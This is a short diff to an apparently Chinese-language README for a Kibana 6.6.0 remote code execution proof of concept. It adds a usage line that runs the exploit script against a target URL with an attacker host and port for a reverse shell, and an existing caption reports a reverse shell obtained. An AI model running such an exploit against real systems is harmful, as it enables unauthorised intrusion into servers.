@@ -17,3 +17,7 @@ POC：
 
 ![](./kibana3.png "成功反弹shell")
 
+
+## 脚本使用
+python kibana6.6.0RCE.py http://ip:port RHOST RPORT
+![](./rce.jpg)
